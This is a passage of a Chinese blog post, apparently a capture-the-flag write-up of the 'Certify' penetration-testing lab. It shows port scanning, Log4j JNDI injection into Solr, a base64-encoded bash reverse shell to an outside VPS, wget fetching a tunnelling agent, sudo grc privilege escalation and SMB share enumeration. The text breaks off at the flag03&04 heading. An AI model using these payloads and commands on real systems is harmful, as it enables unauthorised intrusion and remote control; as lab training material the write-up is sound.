@@ -1,0 +1,1651 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Certify, Hexo">
+    <meta name="description" content="Certifyflag01┌──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]
+└─$ ./fscan -h 39.98.107.120
+
+   ___                   ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Certify | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Certify</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
+                                <span class="chip bg-color">春秋云镜</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">渗透</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                网安
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-08-13
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2025-08-26
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    21 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Certify"><a href="#Certify" class="headerlink" title="Certify"></a>Certify</h1><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/tools/tools/fscan_all_version<span class="token punctuation">]</span>
+└─$ ./fscan <span class="token parameter variable">-h</span> <span class="token number">39.98</span>.107.120
+
+   ___                              _    
+  / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __ 
+ / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /
+/ /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>    
+<span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>   
+                     fscan version: <span class="token number">1.8</span>.4
+start infoscan
+<span class="token number">39.98</span>.107.120:22 <span class="token function">open</span>
+Open result.txt error, <span class="token function">open</span> result.txt: permission denied
+<span class="token number">39.98</span>.107.120:80 <span class="token function">open</span>
+Open result.txt error, <span class="token function">open</span> result.txt: permission denied
+<span class="token number">39.98</span>.107.120:8983 <span class="token function">open</span>
+Open result.txt error, <span class="token function">open</span> result.txt: permission denied
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">3</span>
+start vulscan
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://39.98.107.120      code:200 len:612    title:Welcome to nginx<span class="token operator">!</span>
+Open result.txt error, <span class="token function">open</span> result.txt: permission denied
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://39.98.107.120:8983 code:302 len:0      title:None 跳转url: http://39.98.107.120:8983/solr/
+Open result.txt error, <span class="token function">open</span> result.txt: permission denied
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://39.98.107.120:8983/solr/ code:200 len:16555  title:Solr Admin
+Open result.txt error, <span class="token function">open</span> result.txt: permission denied
+已完成 <span class="token number">3</span>/3
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 扫描结束,耗时: <span class="token number">36</span>.573499548s
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8867c374f476e2e79748d115e69513c6.png"></p>
+<p>用 <code>dnslog</code> 探测一下是否存在 <code>log4j2</code> 漏洞<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">DNSLog Platform</a></p>
+<pre class="line-numbers language-none"><code class="language-none">http://121.89.212.114:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.hsd11b.dnslog.cn} 
+#hsd11b.dnslog.cn是DNSLog Get SubDomain的url
+
+http://39.98.107.120:8983/solr/admin/cores?action=${jndi:ldap://76viqa.dnslog.cn}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/26f533c43d16ef881ecd7e6d0e3f6851.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">先测试一下对方服务器是否会访问我们输入的网址
+/solr/admin/cores?action=${jndi:ldap://ydhthi.dnslog.cn}
+在dnslog成功接受，说明访问该路由可以让对方访问我们的网址，这里利用rogue-jndi进行注入
+在vps上操作
+git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi
+mvn package
+echo 'bash -c bash -i &gt;&amp;/dev/tcp/47.105.50.21/7777 0&gt;&amp;1' | base64
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvNDcuMTA1LjUwLjIxLzc3NzcgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "47.105.50.21" 
+nc -lvnp 7777
+
+传入参数为${jndi:ldap://47.105.50.21:1389/o=reference}
+39.99.137.92:8983/solr/admin/cores?action=${jndi:ldap://47.105.50.21:1389/o=reference}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先在<code>VPS</code>上架设<code>http</code>服务，<code>wget</code>下载linux_x64_agent</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这里<code>wget</code>下载时注意也要用<code>grc</code>提权</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo grc --pty wget http://47.105.50.21/linux_x64_agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">solr@ubuntu:/tmp/xx$ sudo -l
+sudo -l
+Matching Defaults entries for solr on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User solr may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/bin/grc
+    
+    
+solr@ubuntu:/tmp/xx$ sudo grc --help
+sudo grc --help
+Generic Colouriser 1.11.3
+grc [options] command [args]
+Options:
+-e --stderr    redirect stderr. If this option is selected,
+               do not automatically redirect stdout
+-s --stdout    redirect stdout, even if -e is selected
+-c name --config=name    use name as configuration file for grcat
+--colour=word  word is one of: on, off, auto
+--pty          run command in pseudoterminal (experimental)    #在伪终端（pseudoterminal）中运行命令（实验性功能）。
+
+
+solr@ubuntu:/tmp/xx$ sudo grc --pty cat /root/flag/flag01.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250812225159795.png" alt="image-20250812225159795"></p>
+<hr>
+<h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><pre class="line-numbers language-none"><code class="language-none">sudo grc --pty chmod 777 linux_x64_agent
+
+./linux_x64_admin -c 39.99.137.92:7879 -s 123
+
+sudo grc --pty ./linux_x64_agent -l 7879 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">olr@ubuntu:/tmp/xx$ ifconfig
+ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.22.9.19  netmask 255.255.0.0  broadcast 172.22.255.255
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>扫一下</p>
+<pre class="line-numbers language-none"><code class="language-none">dowmload /tmp/xx/result.txt /home/kali/桌面/result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">─$ cat result.txt                              
+172.22.9.7:80 open
+172.22.9.47:80 open
+172.22.9.19:80 open
+172.22.9.19:22 open
+172.22.9.47:22 open
+172.22.9.47:21 open
+172.22.9.19:8983 open
+172.22.9.7:88 open
+172.22.9.26:445 open
+172.22.9.47:445 open
+172.22.9.7:445 open
+172.22.9.26:139 open
+172.22.9.47:139 open
+172.22.9.7:139 open
+172.22.9.26:135 open
+172.22.9.7:135 open
+[*] NetInfo 
+[*]172.22.9.26
+   [-&gt;]DESKTOP-CBKTVMO
+   [-&gt;]172.22.9.26
+[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    
+[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393
+[*] NetInfo 
+[*]172.22.9.7
+   [-&gt;]XIAORANG-DC
+   [-&gt;]172.22.9.7
+[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
+[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!
+[*] OsInfo 172.22.9.47  (Windows 6.1)
+[*] NetBios 172.22.9.47     fileserver                          Windows 6.1
+[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/
+[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server
+[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin
+[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect 
+172.22.9.47:445 open
+172.22.9.47:139 open
+172.22.9.7:139 open
+172.22.9.26:139 open
+172.22.9.47:21 open
+172.22.9.26:135 open
+172.22.9.7:135 open
+172.22.9.7:445 open
+172.22.9.47:80 open
+172.22.9.7:80 open
+172.22.9.47:22 open
+172.22.9.19:80 open
+172.22.9.19:22 open
+172.22.9.19:8983 open
+172.22.9.7:88 open
+172.22.9.26:445 open
+[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!
+[*] NetInfo 
+[*]172.22.9.7
+   [-&gt;]XIAORANG-DC
+   [-&gt;]172.22.9.7
+[*] NetInfo 
+[*]172.22.9.26
+   [-&gt;]DESKTOP-CBKTVMO
+   [-&gt;]172.22.9.26
+[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
+[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server
+[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    
+[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/
+[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393
+[*] NetBios 172.22.9.47     fileserver                          Windows 6.1
+[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin
+[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">172.22.9.19:入口IP
+172.22.9.7:域控制器DC
+172.22.9.26:域成员
+172.22.9.47:文件服务器
+172.22.9.13:CA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>根据提示，文件服务器猜测存在smb的共享，但是fscan不扫描smb的共享模式，只能使用nmap扫描</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains nmap -sT -A -Pn 172.22.9.47 &gt;&gt; nmap01.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~]
+└─# cat nmap01.txt  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 11:05 EDT
+Nmap scan report for 172.22.9.47
+Host is up (0.16s latency).
+Not shown: 995 closed tcp ports (conn-refused)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 44:87:c2:75:d8:b5:cc:a8:3e:b6:2e:55:fa:9c:7f:cc (RSA)
+|   256 ac:ec:b3:76:a2:a2:3a:42:05:ba:14:99:47:a1:4f:71 (ECDSA)
+|_  256 d8:d9:3e:58:6a:66:c9:ea:47:91:53:be:3b:f2:d8:56 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
+No OS matches for host
+Service Info: Host: FILESERVER; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: fileserver
+|   NetBIOS computer name: FILESERVER\x00
+|   Domain name: \x00
+|   FQDN: fileserver
+|_  System time: 2025-08-12T23:09:15+08:00
+|_clock-skew: mean: -2h39m58s, deviation: 4h37m05s, median: 0s
+| smb2-time: 
+|   date: 2025-08-12T15:09:16
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   0.44 ms  192.168.20.2
+2   17.39 ms 192.168.0.1
+3   19.30 ms 10.192.128.1
+4   20.96 ms 1.5.220.60.adsl-pool.sx.cn (60.220.5.1)
+5   ... 30
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 215.85 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th>139/tcp</th>
+<th>open</th>
+<th>netbios-ssn</th>
+<th>Samba smbd 3.X-4.X</th>
+<th>SMB 协议相关端口（NetBIOS 会话服务），用于文件共享</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>445/tcp</td>
+<td>open</td>
+<td>netbios-ssn</td>
+<td>Samba 4.7.6-Ubuntu</td>
+<td>SMB 核心端口，Samba 版本为 4.7.6（2018 年发布），存在历史漏洞（如 EternalBlue 相关漏洞需结合版本判断）</td>
+</tr>
+</tbody></table>
+<ol>
+<li>SMB 服务<ul>
+<li>枚举共享目录：<code>smbclient -L //172.22.9.47 -N</code>（匿名登录），查看是否有可访问的共享（如 <code>fileshare</code> 等）。</li>
+<li>测试漏洞：结合 Samba 4.7.6 版本，检查是否存在可利用漏洞（如 <code>msfconsole</code> 搜索相关模块）。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>在<code>smbclient</code>下是不能直接看的，要用<code>get</code>下载下来</p>
+<pre class="line-numbers language-none"><code class="language-none">smb: \&gt; ls
+  .                                   D        0  Tue Aug 12 10:05:34 2025
+  ..                                  D        0  Wed Jul 13 00:35:09 2022
+  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022
+  secret                              D        0  Tue Aug 12 08:11:19 2025
+  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022
+  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022
+  linux_x64_agent                     A  2227000  Tue Aug 12 10:02:35 2025
+  mb24.exe                            A     7168  Tue Aug 12 10:05:34 2025
+  mb24                                A      198  Tue Aug 12 10:04:25 2025
+
+                41152812 blocks of size 1024. 36030120 blocks available
+smb: \&gt; cat personnel.db
+cat: command not found
+smb: \&gt; get personnel.db
+getting file \personnel.db of size 61440 as personnel.db (58.0 KiloBytes/sec) (average 58.0 KiloBytes/sec)
+smb: \&gt; cd secret
+smb: \secret\&gt; ls
+  .                                   D        0  Tue Aug 12 08:11:19 2025
+  ..                                  D        0  Tue Aug 12 10:05:34 2025
+  flag02.txt                          N      659  Tue Aug 12 08:11:19 2025
+
+                41152812 blocks of size 1024. 36030112 blocks available
+smb: \secret\&gt; get flag02.txt
+getting file \secret\flag02.txt of size 659 as flag02.txt (1.0 KiloBytes/sec) (average 36.0 KiloBytes/sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>需要注意在哪一个目录下运行<code>smbclient</code>，<code>smb</code>就会把下载的文件放到该目录下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/68a24d1af916ce3338ab57d3b796f761.png"></p>
+<hr>
+<h3 id="flag03-04"><a href="#flag03-04" class="headerlink" title="flag03&amp;04"></a>flag03&amp;04</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e92db1f3795daeae31bc9716bd78477b.png"></p>
